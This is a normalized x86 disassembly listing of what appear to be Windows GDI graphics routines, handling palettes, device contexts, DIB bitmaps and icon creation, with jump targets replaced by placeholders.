mov [ fs : eax ] edx
push sub_4252e4
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_4252f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42537e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_425390
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028c8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_425188
mov eax esp
call sub_4252f8
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_425434
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_425188
mov [ esp ] eax
sub_425488
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424e30
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_424e10
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_425634
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424ca0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42555a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_424cb0
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425561
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_424ba4
sub_425561
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424e30
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424ca0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425614
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_424cb0
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42561b
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_425650
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_4256e0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407cc4
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4259d7
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_4257c9
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_424ba4
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257d0
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4257d0
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_425644
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407cc4
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_4259b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_425488
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407cc4
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_425994
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42599b
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026ec
retn
call sub_424bf8
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_425644
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_425650
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_4259e8
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_424b8c
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402ca4
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424e30
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_425acc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_4259e8
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_425b38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4259e8
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425bd5
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425bdc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_425c0c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402ca4
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402ca4
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_425c00
xor edx edx
push ebp
push sub_425dfa
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_425acc
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_425acc
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_425dd3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407cc4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407cc4
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407cc4
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407cc4
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_425b38
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_425b38
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425dda
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026ec
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026ec
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026ec
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_425dda
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e01
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_425e08
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_425e58
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_425eb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_425e58
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425ef9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4031d8
mov edi eax
mov eax esi
call sub_4031d8
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426033
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426016
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407df0
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42601d
mov al 0x1
sub_42604c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ad14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426094
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42609b
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_4260a0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4260d4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ad14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42611f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426126
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_4261e8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4186d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426286
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42628d
mov eax [ rw-data ]
call sub_418738
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42625e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_426378
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4247ac
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418310
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_424750
test al al
je r-xdata
sub_426294
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4186d4
mov esi eax
xor ecx ecx
push ebp
push sub_426304
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418738
retn
mov edx ebx
mov eax esi
call sub_418310
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_426378
sub_426310
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_424104
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42634c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_426378
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4241c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_426378
push ebp
mov ebp esp
push ecx
push ebx
